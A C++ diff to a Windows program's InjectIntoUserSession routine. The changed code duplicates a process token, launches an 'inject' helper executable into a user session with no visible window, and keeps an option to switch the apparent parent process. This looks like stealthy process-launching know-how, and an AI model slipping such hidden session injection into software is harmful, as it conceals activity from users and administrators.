@@ -289,7 +289,6 @@ BOOL Api::Inject()
         {
             return FALSE;
         }
-
     }
 
     return TRUE;
@@ -423,24 +422,22 @@ UINT Api::InjectIntoUserSession(LPVOID pParam)
         LPWSTR lpszPath = NULL;
         LPWSTR* wszCommandLineItems = NULL;
 
-        do
-        {
             hProcess = ::OpenProcess(MAXIMUM_ALLOWED, TRUE, processID);
             if (hProcess == NULL)
-                break;
+                continue;
 
             isSuccess = OpenProcessToken(hProcess,
                 TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
                 &hToken);
             if (isSuccess == FALSE)
-                break;
+                continue;
 
 #define MAKE_ELEVATION 0
 
 #if MAKE_ELEVATION == 0
 
             if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hTokenDup))
-                break;
+                continue;
 
 #else
 
@@ -480,7 +477,7 @@ UINT Api::InjectIntoUserSession(LPVOID pParam)
 
             PROCESS_INFORMATION pi;
             ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-            DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;
+            DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW;
 #endif
 
             if (CreateEnvironmentBlock(&pEnv, hTokenDup, TRUE))
@@ -488,9 +485,9 @@ UINT Api::InjectIntoUserSession(LPVOID pParam)
             else
                 pEnv = NULL;
 
-            lpszPath = _wcsdup(L"TestHideProcess.exe inject"); // fileFullPath
+            lpszPath = _wcsdup(L"InjectionUserModeStarter.exe inject"); // fileFullPath
             if (lpszPath == NULL)
-                break;
+                continue;
 
 #if SWITCH_PARENT > 0
             DWORD ParentId = processID;
@@ -611,15 +608,16 @@ UINT Api::InjectIntoUserSession(LPVOID pParam)
                 &si,
                 &pi);
 #endif
-
+            DWORD err = (isSuccess == FALSE ? GetLastError() : ERROR_SUCCESS);
             if (isSuccess != FALSE)
             {
-                WaitForSingleObject(pi.hProcess, INFINITE);
+                //WaitForSingleObject(pi.hProcess, INFINITE);
 
                 if (pi.hProcess != NULL)
                     CloseHandle(pi.hProcess);
                 if (pi.hThread != NULL)
                     CloseHandle(pi.hThread);
+                break;
             }
 
 #if SWITCH_PARENT > 0
@@ -635,12 +633,10 @@ UINT Api::InjectIntoUserSession(LPVOID pParam)
             DTRACE(DTRACE_USER_PROCESS, "RevertToSelf return %d, error 0x%08X\n", isSuccess, ::GetLastError());
 #endif
 
-        } while (false);
-
         Sleep(2000);
     }
 
-    return 0;
+    return 1;
 }
 
 bool Api::installSrv()
